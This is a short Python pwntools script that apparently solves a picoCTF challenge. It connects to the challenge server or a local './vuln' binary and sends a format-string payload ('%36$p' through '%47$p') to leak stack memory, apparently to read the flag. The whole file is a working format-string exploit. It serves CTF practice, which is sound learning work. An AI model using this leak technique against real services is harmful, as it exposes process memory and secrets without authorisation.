#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("saturn.picoctf.net", 60195)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *vuln+118
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b""
payload +=b"%36$p"
payload +=b"%37$p"
payload +=b"%38$p"
payload +=b"%39$p"
payload +=b"%40$p"
payload +=b"%41$p"
payload +=b"%42$p"
payload +=b"%43$p"
payload +=b"%44$p"
payload +=b"%45$p"
payload +=b"%46$p"
payload +=b"%47$p"

p.recvuntil(">>")
p.sendline(payload)
p.recvuntil("Here's a story - \n")
responce = p.recvline()
p.close()
#u32(flag, endian='little')

